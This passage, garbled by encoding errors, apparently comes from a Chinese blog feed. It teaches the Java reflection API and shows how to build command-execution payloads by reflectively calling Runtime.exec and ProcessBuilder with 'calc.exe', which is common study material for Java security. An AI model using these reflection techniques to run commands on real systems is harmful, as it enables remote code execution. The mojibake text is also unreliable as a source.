æ–¹æ³•</p></li><li><p><code>Constructor getConstructor(ç±» â€¦ parameterTypes)</code>: è·å–ç‰¹å®šæ„é€ æ–¹æ³•</p></li><li><p><code>Constructor&lt;?&gt; getDeclaredConstructors()</code>: è·å–æ‰€æœ‰æ„é€ æ–¹æ³•ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦</p></li><li><p><code>Constructor getDeclaredConstructor(ç±» â€¦ parameterTypes``)</code>: è·å–ç‰¹å®šçš„æ„é€ æ–¹æ³•ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦</p></li></ul><h2 id="è·å–æˆå‘˜æ–¹æ³•"><a href="#è·å–æˆå‘˜æ–¹æ³•" class="headerlink" title="è·å–æˆå‘˜æ–¹æ³•"></a>è·å–æˆå‘˜æ–¹æ³•</h2><ul><li><p><code>Method[] getMethods()</code>: è·å–æ‰€æœ‰ã€publicã€‘ä¿®é¥°çš„æ–¹æ³•ï¼Œçˆ¶ç±»Objectçš„æ–¹æ³•ä¹Ÿèƒ½çœ‹åˆ°</p></li><li><p><code>Method getMethod(String nameï¼Œç±» &lt;?&gt; â€¦ parameterTypes)</code>: è·å–ç‰¹å®šæˆå‘˜æ–¹æ³•</p></li><li><p><code>Method[] getDeclaredMethods()</code>: è·å–æ‰€æœ‰å£°æ˜æ–¹æ³• ä¸è€ƒè™‘ä¿®é¥°ç¬¦</p></li><li><p><code>Method getDeclaredMethod(String nameï¼Œç±» &lt;?&gt; â€¦ parameterTypes)</code>:è·å–ç‰¹å®šæˆå‘˜æ–¹æ³•ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦</p></li></ul><h2 id="åˆ›å»ºç±»å®ä¾‹"><a href="#åˆ›å»ºç±»å®ä¾‹" class="headerlink" title="åˆ›å»ºç±»å®ä¾‹"></a>åˆ›å»ºç±»å®ä¾‹</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Classå¯¹è±¡.newInstance()</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œè¯¥æ–¹æ³•æ—¶ä¼šè°ƒç”¨è¯¥ç±»çš„==å…¬æœ‰æ— å‚æ„é€ æ–¹æ³•==å¯¹è¯¥ç±»è¿›è¡Œå®ä¾‹åŒ–ã€‚</p><h2 id="è°ƒç”¨ç±»æ–¹æ³•"><a href="#è°ƒç”¨ç±»æ–¹æ³•" class="headerlink" title="è°ƒç”¨ç±»æ–¹æ³•"></a>è°ƒç”¨ç±»æ–¹æ³•</h2><p>å‡è®¾è·å–åˆ°çš„æ–¹æ³•å¯¹è±¡ä¸ºmt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt.invoke(æ–¹æ³•å®ä¾‹å¯¹è±¡, æ–¹æ³•å‚æ•°å€¼ï¼Œå¤šä¸ªå‚æ•°å€¼ç”¨&quot;,&quot;éš”å¼€)</span><br></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ç±»å®ä¾‹å¯¹è±¡ï¼Œå¦‚æœè°ƒç”¨çš„æ˜¯<code>static</code>æ–¹æ³•é‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°å€¼å¯ä»¥ä¼ <code>null</code>æˆ–è€…ç±»åï¼Œå› ä¸ºåœ¨javaä¸­è°ƒç”¨é™æ€æ–¹æ³•æ˜¯ä¸éœ€è¦æœ‰ç±»å®ä¾‹çš„ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥<code>ç±»å.æ–¹æ³•å(å‚æ•°)</code>çš„æ–¹å¼è°ƒç”¨ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°ä¸æ˜¯å¿…é¡»çš„ï¼Œå¦‚æœå½“å‰è°ƒç”¨çš„æ–¹æ³•æ²¡æœ‰å‚æ•°ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ä¸ä¼ ï¼Œå¦‚æœæœ‰å‚æ•°é‚£ä¹ˆå°±å¿…é¡»ä¸¥æ ¼çš„<code>ä¾æ¬¡ä¼ å…¥å¯¹åº”çš„å‚æ•°ç±»å‹</code>ã€‚</li></ul><h2 id="ä¿®æ”¹æˆå‘˜å˜é‡-æ–¹æ³•æƒé™"><a href="#ä¿®æ”¹æˆå‘˜å˜é‡-æ–¹æ³•æƒé™" class="headerlink" title="ä¿®æ”¹æˆå‘˜å˜é‡/æ–¹æ³•æƒé™"></a>ä¿®æ”¹æˆå‘˜å˜é‡/æ–¹æ³•æƒé™</h2><p>å‡è®¾è·å–åˆ°çš„å˜é‡å¯¹è±¡ä¸ºfield</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼);</span><br><span class="line">&#x2F;&#x2F;ä¿®æ”¹æˆå‘˜å˜é‡</span><br><span class="line">field.setAccessible(true)</span><br><span class="line">&#x2F;&#x2F;ä¿®æ”¹æˆå‘˜å˜é‡è®¿é—®æƒé™</span><br></pre></td></tr></table></figure><p>åŒç†ä¹Ÿå¯ä»¥å¯¹æ–¹æ³•è¿›è¡Œè®¿é—®æƒé™ä¿®æ”¹ï¼Œè®¾æ–¹æ³•å¯¹è±¡ä¸ºmt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt.setAccessible(true)</span><br></pre></td></tr></table></figure><h1 id="åå°„çš„è¿ç”¨"><a href="#åå°„çš„è¿ç”¨" class="headerlink" title="åå°„çš„è¿ç”¨"></a>åå°„çš„è¿ç”¨</h1><h2 id="ä¸€èˆ¬è¿ç”¨"><a href="#ä¸€èˆ¬è¿ç”¨" class="headerlink" title="ä¸€èˆ¬è¿ç”¨"></a>ä¸€èˆ¬è¿ç”¨</h2><p>å¦‚ä¸‹ä¸€ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨åƒé¥­&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸å®ä¾‹åŒ–å¹¶è°ƒç”¨å…¶æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Person p=<span class="keyword">new</span> Person();</span><br><span class="line">        p.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ­£åœ¨åƒé¥­</span></span><br></pre></td></tr></table></figure><p>è¿ç”¨åå°„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//è·å–Classç±»å¯¹è±¡</span></span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;domain.Person&quot;</span>);</span><br><span class="line">            <span class="comment">//è·å–æŒ‡å®šæ–¹æ³•</span></span><br><span class="line">            Method mt = clazz.getDeclaredMethod(<span class="string">&quot;eat&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">//åˆ›å»ºå®ä¾‹</span></span><br><span class="line">            Object p = clazz.newInstance();</span><br><span class="line">            <span class="comment">//è°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line">            mt.invoke(p);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ­£åœ¨åƒé¥­</span></span><br></pre></td></tr></table></figure><p>å…¶å¯ä»¥ç®€åŒ–ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;domain.Person&quot;</span>);</span><br><span class="line">clazz.getDeclaredMethod(<span class="string">&quot;eat&quot;</span>).invoke(clazz.newInstance());</span><br></pre></td></tr></table></figure><h2 id="å•ä¾‹æ¨¡å¼ä¸‹"><a href="#å•ä¾‹æ¨¡å¼ä¸‹" class="headerlink" title="å•ä¾‹æ¨¡å¼ä¸‹"></a>å•ä¾‹æ¨¡å¼ä¸‹</h2><p>ä¸Šé¢å†™è¿‡ï¼Œ<code>Classå¯¹è±¡.newInstance()</code> ä¼šè°ƒç”¨è¯¥ç±»çš„å…¬æœ‰æ— å‚æ„é€ æ–¹æ³•å¯¹è¯¥ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œé‚£ä¹ˆå¦‚æœè¯¥ç±»æ˜¯â€å•ä¾‹æ¨¡å¼â€å‘¢ï¼Ÿ</p><p>å•ä¾‹æ¨¡å¼ï¼Œæ„é€ å‡½æ•°ä¸ºç§æœ‰ï¼Œåªèƒ½é€šè¿‡é™æ€æ–¹æ³•å»è·å–è¯¥å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleObject</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//åˆ›å»º SingleObject çš„ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> SingleObject instance = <span class="keyword">new</span> SingleObject();</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//è®©æ„é€ å‡½æ•°ä¸º privateï¼Œè¿™æ ·è¯¥ç±»å°±ä¸ä¼šè¢«å®ä¾‹åŒ–</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="title">SingleObject</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//è·å–å”¯ä¸€å¯ç”¨çš„å¯¹è±¡</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleObject <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ä¾‹åŒ–å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonPatternDemo</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è·å–å”¯ä¸€å¯ç”¨çš„å¯¹è±¡</span></span><br><span class="line">      SingleObject object = SingleObject.getInstance();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//æ˜¾ç¤ºæ¶ˆæ¯</span></span><br><span class="line">      object.showMessage();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°±ä¸èƒ½ç”¨ä¸Šé¢å“ªç§æ–¹æ³•å»å®ä¾‹åŒ–å¯¹è±¡äº†ï¼Œä½†åŒæ—¶ä¹Ÿç»™å‡ºäº†å¦ä¸€ç§å®ä¾‹åŒ–å¯¹è±¡çš„æ–¹å¼ï¼Œè°ƒç”¨å…¶é™æ€æ–¹æ³•ã€‚</p><p>çœ‹ä¸€ä¸ªçœŸå®çš„ä¾‹å­ï¼Œ<code>java.lang.Runtime</code>å› ä¸ºæœ‰ä¸€ä¸ª<code>exec</code>æ–¹æ³•å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤ï¼Œæ‰€ä»¥åœ¨å¾ˆå¤šçš„<code>payload</code>ä¸­æˆ‘ä»¬éƒ½èƒ½çœ‹åˆ°åå°„è°ƒç”¨<code>Runtime</code>ç±»æ¥æ‰§è¡Œæœ¬åœ°ç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ°å¥½å®ƒä¹Ÿæ˜¯ä¸ªå•ä¾‹ç±»ã€‚</p><p>é‚£ä¹ˆå¦‚æœæˆ‘è¦åˆ©ç”¨å®ƒæ„é€ payloadæ‰§è¡Œå‘½ä»¤ï¼Œåº”å½“è¿›è¡Œå¦‚ä¸‹æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz =  Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Runtime.getRuntime(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æŒ‡å®šæ„é€ æ–¹æ³•å®ä¾‹åŒ–"><a href="#æŒ‡å®šæ„é€ æ–¹æ³•å®ä¾‹åŒ–" class="headerlink" title="æŒ‡å®šæ„é€ æ–¹æ³•å®ä¾‹åŒ–"></a>æŒ‡å®šæ„é€ æ–¹æ³•å®ä¾‹åŒ–</h2><p>é‚£å‡è®¾å®ƒä¸æ˜¯å•ä¾‹æ¨¡å¼ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•å‘¢ï¼Ÿ</p><p>æ­¤æ—¶æˆ‘ä»¬å°±è¦æŒ‡å®šæ„é€ æ–¹æ³•å¯¹å…¶è¿›è¡Œå®ä¾‹åŒ–ï¼Œä»è€Œè°ƒç”¨å…¶æ–¹æ³•ï¼Œè¿™é‡Œä»¥å¦ä¸€ä¸ªå¸¸ç”¨æ¥æ‰§è¡Œå‘½ä»¤çš„<code>ProcessBuilder</code>ç±»ä¸ºä¾‹ã€‚</p><p>æ­¤ç±»ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œå®ƒæä¾›ä¸€ç§å¯åŠ¨å’Œç®¡ç†è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºï¼‰çš„æ–¹æ³•ã€‚å®ƒæœ‰ä¸¤ä¸ªæ„é€ æ–¹æ³•ï¼Œä½†éƒ½æ˜¯æœ‰å‚æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProcessBuilder</span><span class="params">(List&lt;String&gt; command)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProcessBuilder</span><span class="params">(String... command)</span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹ä¸‹å®ƒçš„ä¸€èˆ¬ç”¨æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ©ç”¨æŒ‡å®šçš„æ“ä½œç³»ç»Ÿç¨‹åºå’Œå‚æ•°æ„é€ ä¸€ä¸ªè¿›ç¨‹ç”Ÿæˆå™¨</span></span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg1&quot;</span>, <span class="string">&quot;myArg2&quot;</span>);</span><br><span class="line"><span class="comment">// //å¯åŠ¨è¿›ç¨‹</span></span><br><span class="line">Process p = pb.start();</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•åˆ©ç”¨åå°„è¿›è¡Œè°ƒç”¨å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥æŒ‡å®šæ„é€ æ–¹æ³•å»è¿›è¡Œå®ä¾‹åŒ–ï¼Œç„¶åè°ƒç”¨start()æ–¹æ³•æ‰§è¡Œä¼ å…¥çš„å‘½ä»¤(ç¨‹åº)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//è·å–Classç±»å¯¹è±¡</span></span><br><span class="line">            Class clazz =  Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">            <span class="comment">//è·å–startæ–¹æ³•ï¼Œå¹¶ç”¨getDeclaredConstructoræ ¹æ®ä¼ å‚ç±»å‹è·å–æŒ‡å®šçš„æ„é€ æ–¹æ³•ï¼Œç„¶ånewInstanceä¼ å…¥å‚æ•°è¿›è¡Œå®ä¾‹åŒ–ï¼Œä»¥invokeè°ƒç”¨</span></span><br><span class="line">            clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getDeclaredConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æˆ‘ä»¬æ˜¯ç”¨çš„ç¬¬ä¸€ä¸ªæ„é€ å‚æ•°ï¼Œé‚£ä¹ˆè¿™æ¬¡ç”¨ç¬¬äºŒä¸ªã€‚</p><p>å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯ï¼Œè¯¥æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹åº”ä¸ºå¯å˜é•¿å‚æ•°ï¼Œå³åŒç±»å‹æ•°ç»„ï¼Œåœ¨è¿™é‡Œæ˜¯å­—ç¬¦ä¸²æ•°ç»„ã€‚</p><p>è€Œä¸”è¿™é‡Œéœ€è¦å†æä¸€ä¸‹ï¼Œ<code>newInstance</code> æ–¹æ³•çš„å‚æ•°ä¸ºObjectæ•°ç»„ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å‘<code>newInstance</code> ä¼ å‚æ—¶åº”å½“ä¼ å…¥ä¸€ä¸ªäºŒç»´æ•°ç»„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz =  Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">            clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getDeclaredConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ‰§è¡Œç§æœ‰æ–¹æ³•"><a href="#æ‰§è¡Œç§æœ‰æ–¹æ³•" class="headerlink" title="æ‰§è¡Œç§æœ‰æ–¹æ³•"></a>æ‰§è¡Œç§æœ‰æ–¹æ³•</h2><p>è¿™é‡Œè€ƒè™‘æœ€åä¸€ç§æƒ…å†µï¼Œæ„é€ æ–¹æ³•ä¸ºç§æœ‰çš„æƒ…å†µï¼Œè¿™æ¬¡ä¾ç„¶ä»¥<code>Runtime</code>ç±»ä¸ºä¾‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//è·å–Classç±»å¯¹è±¡</span></span><br><span class="line">            Class clazz =  Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            <span class="comment">//è·å–æŒ‡å®šæ„é€ æ–¹æ³•</span></span><br><span class="line">            Constructor cs = clazz.getDeclaredConstructor();</span><br><span class="line">            <span class="comment">//è®¾ç½®ä¸ºå¯è®¿é—®æƒé™</span></span><br><span class="line">            cs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//è°ƒç”¨æ‰§è¡Œ</span></span><br><span class="line">            clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(cs.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.yuque.com/ni4n/blogs/rkyeg8#9qnJO">Javaå®‰å…¨ä¹‹åå°„æœºåˆ¶</a></p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaç¯å¢ƒé…ç½®ä¸åŸºç¡€è¯­æ³•</title>
      <link href="posts/52074.html"/>
      <url>posts/52074.html</url>
      
        <content type="html"><![CDATA[<h1 id="Javaç®€ä»‹"><a href="#Javaç®€ä»‹" class="headerlink" title="Javaç®€ä»‹"></a>Javaç®€ä»‹</h1><h2 id="Java-ä½“ç³»"><a href="#Java-ä½“ç³»" class="headerlink" title="Java ä½“ç³»"></a>Java ä½“ç³»</h2><ol><li>Java SEï¼ˆæ ‡å‡†ç‰ˆï¼‰</li><li>Java EEï¼ˆä¼ä¸šç‰ˆï¼‰</li><li>Java MEï¼ˆç²¾ç®€ç‰ˆï¼‰</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/javase.png"></p><h2 id="Java-ç‰¹æ€§"><a href="#Java-ç‰¹æ€§" class="headerlink" title="Java ç‰¹æ€§"></a>Java ç‰¹æ€§</h2><ul><li>ç»“æ„ä¸¥è°¨ï¼Œé¢å‘å¯¹è±¡</li><li>è·¨å¹³å°ï¼ˆJavaæºä»£ç é»˜è®¤ç¼–è¯‘ç»“æœä¸ºå¹³å°é€šç”¨çš„å­—èŠ‚ç ï¼‰</li><li>å®‰å…¨æ€§ä¼˜è¶Šï¼ˆæä¾›äº†ä¸€ç§ç›¸å¯¹å®‰å…¨çš„å†…å­˜ç®¡ç†å’Œè®¿é—®æœºåˆ¶ï¼Œé¿å…äº†ç»å¤§éƒ¨åˆ†çš„å†…å­˜æ³„éœ²å’ŒæŒ‡é’ˆè¶Šç•Œé—®é¢˜ï¼‰</li><li>å¤šçº¿ç¨‹</li><li>åˆ†å¸ƒå¼</li><li>å®Œå–„çš„åº”ç”¨ç¨‹åºæ¥å£</li><li>å¤§é‡çš„ç¬¬ä¸‰æ–¹ç±»åº“</li></ul><h2 id="jdkï¼Ÿjreï¼Ÿjvmï¼Ÿ"><a href="#jdkï¼Ÿjreï¼Ÿjvmï¼Ÿ" class="headerlink" title="jdkï¼Ÿjreï¼Ÿjvmï¼Ÿ"></a>jdkï¼Ÿjreï¼Ÿjvmï¼Ÿ</h2><ol><li><p>jdk(Java development kit)ï¼šjavaå¼€å‘å·¥å…·åŒ…ï¼Œæ”¯æŒJavaç¨‹åºå¼€å‘çš„æœ€å°ç¯å¢ƒï¼Œå³å¦‚æœä½ è¦è¿›è¡ŒJavaå¼€å‘ï¼Œä½ è‡³å°‘è¦åœ¨ä½ çš„å¼€å‘æœºå™¨ä¸Šå®‰è£…JDKã€‚</p><p><strong>JDK = Javaç¨‹åºè®¾è®¡è¯­è¨€+Javaè™šæ‹Ÿæœº+Java APIç±»åº“</strong></p></li><li><p>jre(Java Runtime Environment)ï¼šjavaè¿è¡Œç¯å¢ƒï¼Œæ”¯æŒJavaç¨‹åºè¿è¡Œçš„æ ‡å‡†ç¯å¢ƒï¼Œå¦‚æœä½ 